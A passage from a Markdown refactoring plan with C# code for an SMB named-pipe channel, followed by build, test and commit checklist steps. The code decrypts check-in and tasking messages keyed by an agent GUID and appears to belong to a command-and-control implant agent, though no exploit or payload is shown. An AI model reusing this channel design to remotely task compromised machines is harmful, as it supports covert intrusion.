                agent_guid = this.agentConfig.uuid,
                sequence = 0,
            };
            await this.serverPipe.WriteAsync(sm);
        }

        private Task OnClientDisconnect()
        {
            DebugLog.Log("SMB client disconnected");
            clientConnected.Reset();
            assembler.Clear();
            return Task.CompletedTask;
        }

        private async Task OnMessageReceiveComplete(
            string message)
        {
            if (!checkedin)
            {
                var cir = JsonSerializer.Deserialize(
                    this.crypt.Decrypt(message),
                    CheckinResponseJsonContext.Default
                        .CheckinResponse);
                checkinTcs.TrySetResult(cir);
                return;
            }

            GetTaskingResponse gtr =
                JsonSerializer.Deserialize(
                    this.crypt.Decrypt(message),
                    GetTaskingResponseJsonContext.Default
                        .GetTaskingResponse);

            if (gtr == null)
            {
                return;
            }

            TaskingReceivedArgs tra =
                new TaskingReceivedArgs(gtr);
            SetTaskingReceived?.Invoke(this, tra);
        }

        public async ValueTask DisposeAsync()
        {
            if (disposed) return;
            disposed = true;

            cancellationTokenSource.Cancel();
            cancellationTokenSource.Dispose();
            clientConnected.Dispose();
            if (serverPipe != null)
            {
                await serverPipe.DisposeAsync();
            }
        }
    }
}
```

- [ ] **Step 2: Verify it compiles**

Run: `dotnet build Workflow.Channels.Smb/Workflow.Channels.Smb.csproj`
Expected: Build succeeded

- [ ] **Step 3: Commit**

```bash
git add Workflow.Channels.Smb/SmbProfile.cs
git commit -m "refactor: SmbProfile uses ChunkedMessageAssembler, new protocol, TaskCompletionSource"
```

---

### Task 7: Delete unused MessageReceivedArgs

**Files:**
- Delete: `Workflow.Channels.Smb/MessageReceivedArgs.cs`

- [ ] **Step 1: Delete the file**

```bash
git rm Workflow.Channels.Smb/MessageReceivedArgs.cs
```

- [ ] **Step 2: Verify build still passes**

Run: `dotnet build Workflow.Channels.Smb/Workflow.Channels.Smb.csproj`
Expected: Build succeeded

- [ ] **Step 3: Commit**

```bash
git commit -m "chore: remove unused MessageReceivedArgs class"
```

---

## Chunk 5: Full Verification

### Task 8: Full build and test verification

- [ ] **Step 1: Build entire solution**

Run from `agent_code` directory:
```bash
dotnet build
```
Expected: Build succeeded with 0 errors

- [ ] **Step 2: Run all tests**

```bash
dotnet test Tests/Workflow.Tests/Workflow.Tests.csproj -v n
```
Expected: All tests pass (including ChunkedMessageAssemblerTests and SmbPluginTests)

- [ ] **Step 3: Delete old plan file**

The old plan at `docs/superpowers/plans/2026-03-15-smb-improvements.md` is superseded by this one. However, since this IS that file (overwritten), no action needed.

- [ ] **Step 4: Final commit if any cleanup needed**

```bash
git add -A
git commit -m "chore: final cleanup after SMB protocol simplification"
```
